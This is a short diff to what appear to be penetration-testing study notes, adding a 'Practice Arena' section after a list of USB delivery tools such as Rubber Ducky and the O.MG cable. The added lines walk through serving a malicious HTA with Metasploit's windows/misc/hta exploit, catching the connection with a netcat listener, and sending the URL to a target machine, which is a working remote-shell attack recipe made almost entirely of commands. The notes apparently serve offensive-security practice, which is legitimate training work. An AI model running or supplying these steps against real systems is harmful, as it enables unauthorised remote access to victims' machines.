@@ -173,6 +173,19 @@ USB Delivery
 -events that distribute USB such as conferences
 -Rubber Ducky, USBHarpoon, Charging USB Cable O.MG cable
 
+--------------------------------------------------------------------------------------------------
+
+Practice Arena
+
+Malicious HTA via Metasploit
+msfconsole -q
+use exploit/windows/misc/hta
+-set LHOST, LPORT, SRVHOST, SRVPORT
+exploit
+nc -lvp <LPORT>
+-send url to machine
+
+
 
 
 
